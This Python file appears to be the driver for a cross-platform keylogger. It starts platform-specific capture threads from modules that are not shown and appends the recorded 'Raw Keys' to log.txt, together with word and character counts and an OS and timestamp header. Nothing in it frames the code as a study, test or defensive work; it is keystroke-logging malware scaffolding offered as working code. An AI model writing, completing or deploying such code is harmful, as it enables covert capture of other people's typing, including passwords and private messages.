import platform, threading, time, datetime, re

stop_event = threading.Event()

def get_stats(raw_data):
    words = len(raw_data.split())
    spaces = raw_data.count(' ')
    specials = len(re.findall(r'[^a-zA-Z0-9\s]', raw_data))
    return words, spaces, specials

def finalize_log(raw_data):
    w, s, sc = get_stats(raw_data)
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    header = f"--- {platform.system()} | {now} ---\n"
    stats = f"Words: {w} | Spaces: {s} | Special Characters: {sc}\n"
    content = f"Raw Keys: {raw_data}\n\n"
    with open("log.txt", "a") as f:
        f.write(header + stats + content)

def start_engine():
    if platform.system() == "Windows":
        from logger_win import run_win_logger
        threading.Thread(target=run_win_logger, args=(stop_event,), daemon=True).start()
    else:
        from logger_linux import run_linux_logger
        threading.Thread(target=run_linux_logger, args=(stop_event,), daemon=True).start()

if __name__ == "__main__":
    start_engine()
    print("Engine active. Press Ctrl+C to suspend.")
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        stop_event.set()
        print("Engine suspended.")
